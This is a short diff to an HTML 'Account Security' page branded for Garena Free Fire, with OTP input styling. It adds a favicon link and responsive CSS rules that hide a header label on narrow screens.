@@ -7,6 +7,7 @@
     <meta name="referrer" content="strict-origin-when-cross-origin">
     <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' https://dl.dir.freefiremobile.com data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';">
     <link rel="preconnect" href="https://dl.dir.freefiremobile.com" crossorigin>
+     <link rel="icon" type="image/x-icon" href="https://cdn-gop.garenanow.com/webmain/static/favicon.ico">
     <title>Account Security - Garena Free Fire</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -418,13 +419,16 @@
             .sec-input { width: 42px; height: 50px; font-size: 20px; }
             .resend-screen { padding: 24px 16px; }
         }
-
+        @media (max-width: 750px) {
+            .header-label{ display: none; }
+        }
         /* Small phones */
         @media (max-width: 360px) {
             .otp-input { width: 36px; height: 48px; font-size: 17px; }
             .sec-input { width: 40px; height: 54px; font-size: 20px; }
             .input-row { gap: 4px; }
             .section-desc { margin-left: 40px; }
+            .header-label{ display: none; }
         }
 
         /* Large desktop */
